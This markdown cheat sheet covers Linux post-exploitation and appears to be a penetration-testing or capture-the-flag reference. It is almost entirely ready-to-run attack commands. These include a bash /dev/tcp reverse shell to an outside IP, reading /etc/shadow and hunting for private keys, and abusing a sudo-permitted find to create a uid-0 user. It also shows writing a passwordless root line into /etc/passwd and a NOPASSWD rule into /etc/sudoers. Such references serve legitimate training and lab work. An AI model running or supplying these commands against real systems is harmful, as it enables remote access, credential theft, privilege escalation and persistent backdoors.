# Linux Exploitation

## === Upgrading Shells ===

```bash
# python
python -c 'import pty; pty.spawn("/bin/bash")'
# echo
echo os.system('/bin/bash')
# bash
/bin/bash -i 
# environment variables
SHELL=/bin/bash script -q /dev/null
```

## === Reverse Shells ===

```bash
# bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/1337 0>&1'
```

## === Enumeration Commands ===

### Basic Commands
```bash
id
hostname
# check sudo privileges
sudo -l 
# users on system
cat /etc/passwd 
# try for password hashes
cat /etc/shadow
# find
find / -iname "*file*" -print 2>/dev/null
# grep
grep -iR "pattern" . 2>/dev/null
```

### Versions
```bash
# system distribution (os)
lsb_release -a 
cat /etc/issue
# kernal information
uname -a 
cat /proc/version 
```

### Network
```bash
# netstat
netstat -tulip
# ps
ps aux
ps aux | grep root
```

### Searching
(common world writable folders: /dev/shm/, /tmp/, /var/www/)
```bash
# check webpage
ls -lisa /var/www/html
# check config files
ls -lisa /etc/ | grep .conf
# find all suid programs
find /* -user root -perm -4000 -print 2>/dev/null 
# world writable directories
find / -writable -type d 2>/dev/null
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
# world writable files
find / -perm -2 -type f 2>/dev/null | grep -v "/proc*" 
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null 
# search for private keys
find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
```

## === SUID Exploits ===

### Working with SUID
```bash
# adds suid bit
chmod u+s /bin/executable
# changes path variable
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
```

### Find
```bash
echo "r00t:password" > /tmp/newpass.txt
sudo find . -name "." -exec useradd r00t -ou 0 -g root -s /bin/bash \;
sudo find . -name "." -exec chpasswd < /tmp/newpass.txt \;
```

## === Changing Writable Files to Pwn ===

```bash
# passwd
echo r00t::0:0:r00t:/root:/bin/bash >> /etc/passwd
# sudoers
echo "r00t ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
```